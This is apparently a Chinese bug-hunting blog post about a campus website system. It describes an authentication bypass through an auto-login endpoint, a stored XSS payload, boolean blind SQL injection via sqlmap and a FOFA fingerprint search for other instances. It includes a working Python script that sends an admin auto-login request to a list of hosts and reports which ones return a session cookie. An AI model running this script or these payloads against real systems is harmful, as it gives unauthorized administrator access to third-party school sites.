---
title: 记一次校园网站漏洞通杀
date: 2024-10-08 18:45
cover: true
sidebar: []
readmore: true
tags: 
- 公众号推文
- Web安全
categories:
- 公众号推文
---
# 01 漏洞挖掘
## Part.01

**逻辑缺陷**

熟悉的页面，熟悉的弱口令测试，但无果
![images](/images/edu-vuln-mining-record/1.png)
我就把目光转向js审计，果不其然有新发现，可以根据账号自动登录
![images](/images/edu-vuln-mining-record/2.png)
于是直接构造请求绕过登录
![images](/images/edu-vuln-mining-record/3.png)
经典的管理员权限

## Part.02
**存储型xss**
寻找文本输入
![images](/images/edu-vuln-mining-record/4.png)
浅析： 前端：这里的标签都是普通标签，没有像RCDATA元素(RCDATA elements)，有<textarea>和<title>，会做一次HTML编码，所以可以直接插入危险的js代码。 后端：没有任何过滤（笑~

![images](/images/edu-vuln-mining-record/5.png)

所以就简单了，直接插入<script>alert('1')</script>即可
![images](/images/edu-vuln-mining-record/6.png)

## Part.03
**SQL注入**
![images](/images/edu-vuln-mining-record/7.png)
测试无果
![images](/images/edu-vuln-mining-record/8.png)
最后发现注入点在第一个函数，果然任何一个输入点都是不安全的，是布尔型盲注
![images](/images/edu-vuln-mining-record/9.png)
后面就是经典Sqlmap了
![images](/images/edu-vuln-mining-record/10.png)

# 02 继续通杀

根据系统指纹在fofa上搜索："xx系统" && icon_hash="11xxxx" 有32个IP，看了下，有重复的
![images](/images/edu-vuln-mining-record/11.png)
使用fofa_viewer导出目标 这里我根据第一个逻辑漏洞的漏洞指纹信息，写了一个poc

```python
import requests


def poc(url):
    poc_url = url + '/login/doautologin.edu'
    data = {'um.userid': "admin"}
    try:
        res = requests.post(poc_url, data=data, timeout=5)
        if (res.headers.get("Set-Cookie")): # 登录成功就会set-cookie
            print(url + '/login.html')
    except BaseException:  
        pass


if __name__ == '__main__':
    with open('url.txt', 'r') as f:
        for i in f:
            poc(i.rstrip('\n'))
```



# 03 思考总结

**01.**在访问系统当中的时候F12查看源码是一个不错的习惯（尤其是有前端弹框的）



**02.**前端代码的一切展示行为完全可控(一定要理解这句话) 



**03.**了解程序的底层逻辑，你才能更清晰的知道每一个参数的意义



